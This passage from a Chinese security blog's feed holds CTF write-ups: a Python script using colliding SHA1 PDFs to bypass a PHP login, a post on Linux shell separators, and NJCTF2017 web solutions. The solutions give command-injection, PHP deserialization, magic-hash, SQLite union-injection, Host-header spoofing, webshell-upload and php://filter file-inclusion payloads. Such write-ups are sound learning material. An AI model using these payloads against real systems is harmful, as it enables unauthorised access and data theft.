class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">'&lt;p class="alert"&gt;Invalid password.&lt;/p&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>还以为是当初那个利用数组绕过弱等的题目，然后发现<code>name</code>跟<code>password</code>各有一个<code>string</code>限制，而且是<code>===</code>强等于,Google了一下发现一篇<a href="https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md" target="_blank" rel="external">文章</a>对两篇PDF加密可以获得同样的SHA1值,还是挺有意思的，附上代码：<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">import requests</div><div class="line"></div><div class="line"># this is copy/paste from Hex editor - two different files with the same SHA1 checksum</div><div class="line">name = '<span class="number">255044462</span>D312E33 <span class="number">0A25E2E3</span> CFD30A0A <span class="number">0A312030</span> <span class="number">206</span>F626A <span class="number">0</span>A3C3C2F <span class="number">57696474</span> <span class="number">68203220</span> <span class="number">3020522</span>F <span class="number">48656967</span> <span class="number">68742033</span> <span class="number">20302052</span> <span class="number">2F547970</span> <span class="number">65203420</span> <span class="number">3020522</span>F <span class="number">53756274</span> <span class="number">79706520</span> <span class="number">35203020</span> <span class="number">522F4669</span> <span class="number">6C746572</span> <span class="number">20362030</span> <span class="number">20522F43</span> <span class="number">6F6C6F72</span> <span class="number">53706163</span> <span class="number">65203720</span> <span class="number">3020522</span>F <span class="number">4C656E67</span> <span class="number">74682038</span> <span class="number">20302052</span> <span class="number">2F426974</span> <span class="number">73506572</span> <span class="number">436F6D70</span> <span class="number">6</span>F6E656E <span class="number">7420383</span>E <span class="number">3E0A7374</span> <span class="number">7265616</span>D <span class="number">0</span>AFFD8FF FE0024<span class="number">53 48412D31</span> <span class="number">20697320</span> <span class="number">64656164</span> <span class="number">21212121</span> <span class="number">21852</span>FEC <span class="number">09233975</span> <span class="number">9C39B1A1</span> C63C4C97 E1FFFE01 <span class="number">7</span>F46DC93 A6B67E01 <span class="number">3</span>B029AAA <span class="number">1</span>DB2560B <span class="number">45</span>CA67D6 <span class="number">88</span>C7F84B <span class="number">8</span>C4C791F E02B3DF6 <span class="number">14</span>F86DB1 <span class="number">690901C5</span> <span class="number">6B45C153</span> <span class="number">0</span>AFEDFB7 <span class="number">6038E972</span> <span class="number">722</span>FE7AD <span class="number">728F0E49</span> <span class="number">04E046C2</span> <span class="number">30570</span>FE9 D41398AB E12EF5BC <span class="number">942</span>BE335 <span class="number">42</span>A4802D <span class="number">98</span>B5D70F <span class="number">2</span>A332EC3 <span class="number">7</span>FAC3514 E74DDC0F <span class="number">2</span>CC1A874 CD0C78<span class="number">30 5A215664</span> <span class="number">61309789</span> <span class="number">606</span>BD0BF <span class="number">3</span>F98CDA8 <span class="number">044629A1</span> <span class="number">3</span>C68746D <span class="number">6</span>C3E0A3C <span class="number">73637269</span> <span class="number">7074206</span>C <span class="number">616E6775</span> <span class="number">6167653</span>D <span class="number">6A617661</span> <span class="number">73637269</span> <span class="number">70742074</span> <span class="number">7970653</span>D <span class="number">22746578</span> <span class="number">742F6A61</span> <span class="number">76617363</span> <span class="number">72697074</span> <span class="number">223</span>E0A3C <span class="number">212D2D20</span> <span class="number">40617277</span> <span class="number">202</span>D2D3E <span class="number">0A0A7661</span> <span class="number">72206820</span> <span class="number">3</span>D20646F <span class="number">63756D65</span> <span class="number">6E742E67</span> <span class="number">6574456</span>C <span class="number">656</span>D656E <span class="number">74734279</span> <span class="number">5461674</span>E <span class="number">616D6528</span> <span class="number">2248544</span>D <span class="number">4</span>C22295B <span class="number">305D2E69</span> <span class="number">6E6E6572</span> <span class="number">48544</span>D4C <span class="number">2E636861</span> <span class="number">72436F64</span> <span class="number">65417428</span> <span class="number">31303229</span> <span class="number">2E746F53</span> <span class="number">7472696</span>E <span class="number">67283136</span> <span class="number">293B0A69</span> <span class="number">66202868</span> <span class="number">203D3D20</span> <span class="number">27373327</span> <span class="number">29207</span>B0A <span class="number">20202020</span> <span class="number">646F6375</span> <span class="number">6D656E74</span> <span class="number">2E626F64</span> <span class="number">792</span>E696E <span class="number">6E657248</span> <span class="number">544D4C20</span> <span class="number">3</span>D20223C <span class="number">5354594</span>C <span class="number">453</span>E626F <span class="number">64797B62</span> <span class="number">61636B67</span> <span class="number">726</span>F756E <span class="number">642</span>D636F <span class="number">6</span>C6F723A <span class="number">5245443</span>B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">383</span>B3C2F <span class="number">48313E22</span> <span class="number">3B0A7D20</span> <span class="number">656C7365</span> <span class="number">207B0A20</span> <span class="number">20202064</span> <span class="number">6</span>F63756D <span class="number">656</span>E742E <span class="number">626F6479</span> <span class="number">2</span>E696E6E <span class="number">65724854</span> <span class="number">4</span>D4C203D <span class="number">20223C53</span> <span class="number">54594C45</span> <span class="number">3E626F64</span> <span class="number">797B6261</span> <span class="number">636B6772</span> <span class="number">6F756E64</span> <span class="number">2</span>D636F6C <span class="number">6F723A42</span> <span class="number">4</span>C55453B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">393</span>B3C2F <span class="number">48313E22</span> <span class="number">3</span>B0A7D0A <span class="number">0A3C2F73</span> <span class="number">63726970</span> <span class="number">743</span>E0A0A'</div><div class="line"></div><div class="line">password = '<span class="number">25504446</span> <span class="number">2D312E33</span> <span class="number">0A25E2E3</span> CFD30A0A <span class="number">0A312030</span> <span class="number">206</span>F626A <span class="number">0</span>A3C3C2F <span class="number">57696474</span> <span class="number">68203220</span> <span class="number">3020522</span>F <span class="number">48656967</span> <span class="number">68742033</span> <span class="number">20302052</span> <span class="number">2F547970</span> <span class="number">65203420</span> <span class="number">3020522</span>F <span class="number">53756274</span> <span class="number">79706520</span> <span class="number">35203020</span> <span class="number">522F4669</span> <span class="number">6C746572</span> <span class="number">20362030</span> <span class="number">20522F43</span> <span class="number">6F6C6F72</span> <span class="number">53706163</span> <span class="number">65203720</span> <span class="number">3020522</span>F <span class="number">4C656E67</span> <span class="number">74682038</span> <span class="number">20302052</span> <span class="number">2F426974</span> <span class="number">73506572</span> <span class="number">436F6D70</span> <span class="number">6</span>F6E656E <span class="number">7420383</span>E <span class="number">3E0A7374</span> <span class="number">7265616</span>D <span class="number">0</span>AFFD8FF FE0024<span class="number">53 48412D31</span> <span class="number">20697320</span> <span class="number">64656164</span> <span class="number">21212121</span> <span class="number">21852</span>FEC <span class="number">09233975</span> <span class="number">9C39B1A1</span> C63C4C97 E1FFFE01 <span class="number">7346</span>DC<span class="number">91 66B67E11</span> <span class="number">8</span>F029AB6 <span class="number">21</span>B2560F F9CA67CC A8C7F85B A84C7903 <span class="number">0</span>C2B3DE2 <span class="number">18</span>F86DB3 <span class="keyword">A</span><span class="number">90901D5</span> DF45C14F <span class="number">26</span>FEDFB3 DC38E96A C22FE7BD <span class="number">728F0E45</span> BCE046D2 <span class="number">3</span>C570FEB <span class="number">141398</span>BB <span class="number">552</span>EF5A0 A82BE331 FEA48037 B8B5D71F <span class="number">0</span>E332EDF <span class="number">93</span>AC3500 EB4DDC0D ECC1A864 <span class="number">790</span>C782C <span class="number">76215660</span> DD309791 D06BD0AF <span class="number">3</span>F98CDA4 BC4629B1 <span class="number">3</span>C68746D <span class="number">6</span>C3E0A3C <span class="number">73637269</span> <span class="number">7074206</span>C <span class="number">616E6775</span> <span class="number">6167653</span>D <span class="number">6A617661</span> <span class="number">73637269</span> <span class="number">70742074</span> <span class="number">7970653</span>D <span class="number">22746578</span> <span class="number">742F6A61</span> <span class="number">76617363</span> <span class="number">72697074</span> <span class="number">223</span>E0A3C <span class="number">212D2D20</span> <span class="number">40617277</span> <span class="number">202</span>D2D3E <span class="number">0A0A7661</span> <span class="number">72206820</span> <span class="number">3</span>D20646F <span class="number">63756D65</span> <span class="number">6E742E67</span> <span class="number">6574456</span>C <span class="number">656</span>D656E <span class="number">74734279</span> <span class="number">5461674</span>E <span class="number">616D6528</span> <span class="number">2248544</span>D <span class="number">4</span>C22295B <span class="number">305D2E69</span> <span class="number">6E6E6572</span> <span class="number">48544</span>D4C <span class="number">2E636861</span> <span class="number">72436F64</span> <span class="number">65417428</span> <span class="number">31303229</span> <span class="number">2E746F53</span> <span class="number">7472696</span>E <span class="number">67283136</span> <span class="number">293B0A69</span> <span class="number">66202868</span> <span class="number">203D3D20</span> <span class="number">27373327</span> <span class="number">29207</span>B0A <span class="number">20202020</span> <span class="number">646F6375</span> <span class="number">6D656E74</span> <span class="number">2E626F64</span> <span class="number">792</span>E696E <span class="number">6E657248</span> <span class="number">544D4C20</span> <span class="number">3</span>D20223C <span class="number">5354594</span>C <span class="number">453</span>E626F <span class="number">64797B62</span> <span class="number">61636B67</span> <span class="number">726</span>F756E <span class="number">642</span>D636F <span class="number">6</span>C6F723A <span class="number">5245443</span>B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">383</span>B3C2F <span class="number">48313E22</span> <span class="number">3B0A7D20</span> <span class="number">656C7365</span> <span class="number">207B0A20</span> <span class="number">20202064</span> <span class="number">6</span>F63756D <span class="number">656</span>E742E <span class="number">626F6479</span> <span class="number">2</span>E696E6E <span class="number">65724854</span> <span class="number">4</span>D4C203D <span class="number">20223C53</span> <span class="number">54594C45</span> <span class="number">3E626F64</span> <span class="number">797B6261</span> <span class="number">636B6772</span> <span class="number">6F756E64</span> <span class="number">2</span>D636F6C <span class="number">6F723A42</span> <span class="number">4</span>C55453B <span class="number">7D206831</span> <span class="number">7</span>B666F6E <span class="number">742D7369</span> <span class="number">7A653A35</span> <span class="number">3030253</span>B <span class="number">7D3C2F53</span> <span class="number">54594C45</span> <span class="number">3E3C4831</span> <span class="number">3E262378</span> <span class="number">31663634</span> <span class="number">393</span>B3C2F <span class="number">48313E22</span> <span class="number">3</span>B0A7D0A <span class="number">0A3C2F73</span> <span class="number">63726970</span> <span class="number">743</span>E0A0A'</div><div class="line"></div><div class="line">print '[+] create URL decoded strings to send as GET parameters [name] and [password]...'</div><div class="line">name = ''.join(name.split(' '))</div><div class="line">password = ''.join(password.split(' '))</div><div class="line"></div><div class="line">namestr = ''.join(['%' + name[i] + name[i + <span class="number">1</span>]</div><div class="line">           for i in range(<span class="number">0</span>, len(name)) if i % <span class="number">2</span> == <span class="number">0</span>])</div><div class="line"></div><div class="line">passwordstr = ''.join(['%' + password[j] + password[j + <span class="number">1</span>]</div><div class="line">           for j in range(<span class="number">0</span>, len(password)) if j % <span class="number">2</span> == <span class="number">0</span>])</div><div class="line"></div><div class="line">print '[+] sending request to http://<span class="number">127.0.0.1</span>/upload/test.php/?name=[name]&amp;password=[password]'</div><div class="line"></div><div class="line">u = 'http://<span class="number">127.0.0.1</span>/upload/test.php/?name=&#123;&#125;&amp;password=&#123;&#125;'.format(namestr, passwordstr)</div><div class="line"></div><div class="line">resp = requests.get(u, headers=&#123;</div><div class="line">    'Host': '<span class="number">127.0.0.1</span>'</div><div class="line">&#125;)</div><div class="line"></div><div class="line">print '[+] read FLAG from response...\n\n'</div><div class="line">print resp.content</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SHA1 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux 下命令分割符的区别]]></title>
      <url>http://isron.cn/2017/03/15/Linux_shell/</url>
      <content type="html"><![CDATA[<p>Linux的Shell命令分割符有<code>&amp;</code>,<code>&amp;&amp;</code>，<code>||</code>,<code>;</code><a id="more"></a>，在上周NJCTF时用到了这些符号，但是还不是很懂到底什么意思,多谢我的<a href="https://RcoIl.github.io" target="_blank" rel="external">傻仔</a>,让我深入了解了这些符号。</p>
<h2 id="amp"><a href="#amp" class="headerlink" title="&amp;"></a>&amp;</h2><p>通过&amp;可以拼接执行接下来的命令但是前后两个命令并不会影响，即使前面命令出错也不影响后面命令的执行。<br>栗子：<br><img src="http://p1.bpimg.com/567571/265eb4ffcf1301d5.png" alt=""><br>前面命令已经cd 到Desktop目录下但是&amp;后面的ls命令还是执行在当前目录下而不是Desktop目录下</p>
<h2 id="amp-amp"><a href="#amp-amp" class="headerlink" title="&amp;&amp;"></a>&amp;&amp;</h2><p>&amp;&amp;符相当于运算符中的and 只有当前面为True才会执行后面的语句如果为Flase则不执行，且会因为前面的语句影响后面的内容。<br>栗子：<br><img src="http://p1.bpimg.com/567571/40f7ad5edd4be04c.png" alt=""><br>cd到Desktop目录下然后ls也是在Desktop目录下执行的。<br><img src="http://p1.bpimg.com/567571/f4e47dd3e87aca12.png" alt=""><br>前面命令出错后面直接就不执行</p>
<h2 id=""><a href="#" class="headerlink" title="||"></a>||</h2><p>||符相当于运算符中的或，当前面命令为True时只执行前面的命令，如果为Flase则执行后面的命令。<br>栗子：<br><img src="http://i1.piimg.com/567571/3c6cae2d7fef4bcc.png" alt=""><br>只执行了<code>cd ../</code><br><img src="http://i1.piimg.com/567571/f373d66ec5a2c64d.png" alt=""><br>由于前面命令出错所以执行后面的ls命令</p>
<h2 id="；"><a href="#；" class="headerlink" title="；"></a>；</h2><p>;命令不管怎么样都会执行后面的命令但是跟&amp;有点不同。<br>栗子：<br><img src="http://p1.bpimg.com/567571/fe9c1f57b8dd41fd.png" alt=""><br>执行cd Desktop 且执行 ls 并且 ls 是在Desktop目录下执行的，而&amp;是不会改变当前目录<br><img src="http://i1.piimg.com/567571/2b164c6dc3e2d9b0.png" alt=""><br>由于没有dasd目录但是ls还是会执行，且在当前目录下</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux命令 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NJCTF2017]]></title>
      <url>http://isron.cn/2017/03/15/NJCTF2017/</url>
      <content type="html"><![CDATA[<p>NJCTF题目还是不错的，虽然很多都没做出来，总结总结慢慢积累<a id="more"></a></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>打开发现让登录，右下可以注册，直接想到去年ISCC的mysql超长字符串截取，注册admin             q,由于mysql只截取前十六位所以直接用admin就能登陆获取flag。</p>
<h2 id="Get-Flag"><a href="#Get-Flag" class="headerlink" title="Get Flag"></a>Get Flag</h2><p>一个输入框可以查询图片信息，随便输入一个发现<br><img src="http://i1.piimg.com/567571/3fef7aff8ed61a23.png" alt=""><br>base64解码之后发现是<code>cat: images/....: No such file or directory</code>发现了一个cat想到是linux命令但是也没深入去想然后<a href="https://RcoIl.github.io" target="_blank" rel="external">傻仔</a>告诉我是命令执行,尝试利用管道命令||发现返回<br><img src="http://p1.bpimg.com/567571/f92d79e53847c0b2.png" alt=""><br>说明过滤掉了||，然后告诉我说用&amp;进行命令执行<a href="http://isron.cn/2017/03/15/Linux_shell/">各种分隔符之间的区别</a><br>payload：<code>&amp; cd ../../ &amp;&amp; ls</code>,<code>&amp; cd ../../ &amp;&amp; cat 9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flag</code></p>
<h2 id="Text-wall"><a href="#Text-wall" class="headerlink" title="Text wall"></a>Text wall</h2><p>一个留言墙发现可以随便留言，最开始想的是XSS但是发现并没有什么卵用，通过查看cookies:<code>24c5889e00902d6bcc65073f0e91ea30bbe203c2a:1:{i:0;s:9:&quot;hiehiehie&quot;;}</code>发现是PHP序列化，将<code>a:1:{i:0;s:9:&quot;hiehiehie&quot;;}</code>SHA1加密后正是前面的内容，然后就没头绪了，学长说在.index.php.swo下有源码，还是知识太少，获得源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$lists = [];</div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">........</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<pre><code>highlight_file ： 语法高亮一个文件
</code></pre><p>得到源码那么就构造PHP序列化然后通过他的<code>__toString</code>方法去读取文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">filelist</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> highlight_file(<span class="string">'hiehiehie.txt'</span>, <span class="keyword">true</span>).highlight_file(<span class="keyword">$this</span>-&gt;source, <span class="keyword">true</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$a = <span class="keyword">new</span> filelist;</div><div class="line">$a-&gt;source = <span class="string">'index.php'</span>;</div><div class="line">$d = serialize([$a]);</div><div class="line">$b = sha1($d).$d;</div><div class="line"><span class="keyword">echo</span> urlencode($b);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p><img src="http://p1.bpimg.com/567571/83296ce306a25555.png" alt=""><br>得到源码知道flag的位置那么<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$a</span>-&gt;<span class="built_in">source</span> = <span class="string">'/var/www/PnK76P1IDfY5KrwsJrh1pL3c6XJ3fj7E_fl4g'</span>;</div></pre></td></tr></table></figure></p>
<p>得到flag<a href="http://isron.cn/2017/03/03/php_unserialize/">PHP序列化</a></p>
<h3 id="SHA1加密与MD5"><a href="#SHA1加密与MD5" class="headerlink" title="SHA1加密与MD5"></a>SHA1加密与MD5</h3><p>MD5加密后共32位，SHA1加密后共40位都由1-9,a-f组成</p>
<h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>目前所知道的有：</p>
<ul>
<li>index.php.bak ： 备份文件源码泄露</li>
<li>.index.php.swp ： vim异常退出源码泄露</li>
<li>.index.php.swo ： 交换文件源码泄露</li>
<li>index.php~ ： linux临时文件源码泄露</li>
<li>www.zip ： 压缩包源码泄露</li>
<li>git源码泄露</li>
</ul>
<h2 id="Wallet"><a href="#Wallet" class="headerlink" title="Wallet"></a>Wallet</h2><p>扫描发现有www.zip压缩包源码泄露，然后得到hint：压缩包密码为弱口令，然后就弱智的在那爆破，后来大师傅说就是njctf2017，很难受，宛如一个智障。<br><img src="http://i1.piimg.com/567571/c5d8b7942fde18dc.png" alt=""><br>打开发现是PHPjm加密<a href="http://tool.lu/php/" target="_blank" rel="external">PHPjm解密</a>得到源码:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">require_once</span> <span class="string">"db.php"</span>;</div><div class="line">$auth = <span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"auth"</span>])) &#123;</div><div class="line">    $auth = $_COOKIE[<span class="string">"auth"</span>];</div><div class="line">    $hsh = $_COOKIE[<span class="string">"hsh"</span>];</div><div class="line">    <span class="keyword">if</span> ($auth == $hsh) &#123;</div><div class="line">        $auth = <span class="number">0</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (sha1((string) $hsh) == md5((string) $auth)) &#123;</div><div class="line">            $auth = <span class="number">1</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            $auth = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $auth = <span class="number">0</span>;</div><div class="line">    $s = $auth;</div><div class="line">    setcookie(<span class="string">"auth"</span>, $s);</div><div class="line">    setcookie(<span class="string">"hsh"</span>, sha1((string) $s));</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> ($auth) &#123;</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'query'</span>])) &#123;</div><div class="line">        $db = <span class="keyword">new</span> SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);</div><div class="line">        $qstr = SQLITE3::escapeString($_GET[<span class="string">'query'</span>]);</div><div class="line">        $query = <span class="string">"SELECT amount FROM my_wallets WHERE id=&#123;$qstr&#125;"</span>;</div><div class="line">        $result = $db-&gt;querySingle($query);</div><div class="line">        <span class="keyword">if</span> (!$result === <span class="keyword">NULL</span>) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Error - invalid query"</span>;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Wallet contains: &#123;$result&#125;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</div><div class="line">    &#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, not authorized."</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>存在一个<code>sha1((string) $hsh) == md5((string) $auth)</code>想到用0e去突破限制<code>auth:240610708 == hsh：aaroZmOk</code>然后就是一个sqlite数据库的sql注入，由于只接触了mysql数据库的语句，直接附上大佬的payload：</p>
<pre><code>爆表：http://218.2.197.235:23723/admin.php?query=1 union SELECT tbl_name FROM sqlite_master limit 1,1
爆字段：http://218.2.197.235:23723/admin.php?query=1 union SELECT sql FROM sqlite_master limit 2,1
爆内容：http://218.2.197.235:23723/admin.php?query=1 union SELECT id FROM flag limit 1,1
</code></pre><h2 id="pictures-wall"><a href="#pictures-wall" class="headerlink" title="pictures wall"></a>pictures wall</h2><p>随便输入就能登陆，然后提示只有root才有上传权限 在upload/1.tar.gz下发现源码，在login.php发现<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ip = $_SERVER[<span class="string">'HTTP_HOST'</span>];</div><div class="line">        <span class="keyword">if</span>($ip == <span class="string">"::1"</span> <span class="params">||</span> $ip == <span class="string">"127.0.0.1"</span>)&#123;</div><div class="line">            $_SESSION[<span class="string">"token"</span>] = <span class="string">"0"</span>;</div></pre></td></tr></table></figure></p>
<p>在登录时修改host头为127.0.0.1成功获取root权限，查看upload.php发现，可以上传phtml与phps。<br><img src="http://i1.piimg.com/567571/4b90803e9609112f.png" alt=""><br>直接上传一句话发现只是打印出来并没有解析，那么就构造<br><img src="http://i1.piimg.com/567571/7a56c50170c787ae.png" alt=""><br>得到文件地址：<br>payload：</p>
<pre><code>i=echo `ls ../../`;
i=echo `cat /var/www/AOvU7WJDRTxn1tv2g56SJLpJK1l7EmBi_thi5_flag`;
</code></pre><h2 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h2><p>在上传时发现<code>http://218.2.197.235:23735/?page=upload</code>觉得存在文件包含漏洞，利用php的filter流尝试一下得到源码<code>http://218.2.197.235:23735/?page=php://filter/convert.base64-encode/resource=upload</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span></span></div><div class="line"><span class="title">function</span> <span class="title">show_message</span><span class="params">($message)</span></div><div class="line"><span class="title">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span></div><div class="line">&#123;</div><div class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</div><div class="line">        <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</div><div class="line">        <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</div><div class="line">        <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</div><div class="line">        <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</div><div class="line">    $str = <span class="string">''</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</div><div class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span 